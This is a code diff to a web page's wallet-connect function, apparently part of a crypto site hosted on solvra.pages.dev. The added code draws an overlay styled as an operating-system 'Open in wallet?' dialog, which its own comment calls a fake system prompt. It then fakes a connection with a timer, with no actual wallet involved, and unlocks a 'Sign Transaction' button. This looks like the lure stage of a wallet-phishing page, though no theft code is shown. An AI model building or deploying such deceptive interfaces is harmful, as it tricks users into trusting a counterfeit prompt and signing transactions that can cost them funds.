@@ -329,38 +329,60 @@
       function connectWallet(element, walletName) {
         if (isConnected) return; // Prevent clicking multiple wallets
 
-        // 1. Visually change the clicked wallet to "Connecting..."
-        const walletItems = document.querySelectorAll('.wallet-item');
-        const clickedName = element.querySelector('.wallet-name');
-        const clickedChevron = element.querySelector('.wallet-chevron');
-        
-        clickedName.innerText = "Connecting...";
-        element.style.borderColor = "#3b6cf8";
-        clickedChevron.style.display = "none"; // Hide arrow
+        // 1. Show a Fake "System Prompt" to simulate opening the real app
+        const fakePrompt = document.createElement('div');
+        fakePrompt.innerHTML = `
+          <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.6); backdrop-filter: blur(4px); display: flex; align-items: center; justify-content: center; z-index: 9999;">
+            <div style="background: #1c1c1e; width: 280px; border-radius: 14px; text-align: center; padding: 20px; font-family: -apple-system, sans-serif; color: white; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
+              <p style="font-size: 16px; font-weight: 600; margin-bottom: 4px;">Open in ${walletName}?</p>
+              <p style="font-size: 12px; color: #8e8e93; margin-bottom: 20px;">solvra.pages.dev wants to connect to your wallet.</p>
+              <div style="display: flex; border-top: 1px solid #333; margin: 0 -20px -20px; border-radius: 0 0 14px 14px;">
+                <button id="cancelPrompt" style="flex: 1; background: none; border: none; border-right: 1px solid #333; color: #0a84ff; font-size: 16px; padding: 14px; cursor: pointer;">Cancel</button>
+                <button id="openPrompt" style="flex: 1; background: none; border: none; color: #0a84ff; font-size: 16px; font-weight: 600; padding: 14px; cursor: pointer;">Open</button>
+              </div>
+            </div>
+          </div>
+        `;
+        document.body.appendChild(fakePrompt);
 
-        // Dim other wallets
-        walletItems.forEach(item => {
-          if (item !== element) {
-            item.style.opacity = "0.3";
-            item.style.pointerEvents = "none";
-          }
-        });
+        // 2. Handle the Cancel button
+        document.getElementById('cancelPrompt').onclick = () => {
+          fakePrompt.remove();
+        };
 
-        // 2. Simulate network delay (2 seconds)
-        setTimeout(() => {
-          clickedName.innerText = "Connected";
-          clickedName.style.color = "#4ade80";
-          element.style.borderColor = "#22c55e";
+        // 3. Handle the Open button
+        document.getElementById('openPrompt').onclick = () => {
+          fakePrompt.remove();
           
-          // 3. Enable the Authorize button
-          isConnected = true;
-          const authBtn = document.getElementById('authBtn');
-          authBtn.style.opacity = "1";
-          authBtn.style.pointerEvents = "auto";
+          // Now run the connection simulation
+          const walletItems = document.querySelectorAll('.wallet-item');
+          const clickedName = element.querySelector('.wallet-name');
+          const clickedChevron = element.querySelector('.wallet-chevron');
           
-          // Change button text to "Sign Transaction"
-          document.getElementById('btnText').innerText = "Sign Transaction";
-        }, 2000);
+          clickedName.innerText = "Connecting...";
+          element.style.borderColor = "#3b6cf8";
+          clickedChevron.style.display = "none";
+
+          walletItems.forEach(item => {
+            if (item !== element) {
+              item.style.opacity = "0.3";
+              item.style.pointerEvents = "none";
+            }
+          });
+
+          // Simulate the 2-second connection delay
+          setTimeout(() => {
+            clickedName.innerText = "Connected";
+            clickedName.style.color = "#4ade80";
+            element.style.borderColor = "#22c55e";
+            
+            isConnected = true;
+            const authBtn = document.getElementById('authBtn');
+            authBtn.style.opacity = "1";
+            authBtn.style.pointerEvents = "auto";
+            document.getElementById('btnText').innerText = "Sign Transaction";
+          }, 1500);
+        };
       }
     </script>
   </body>
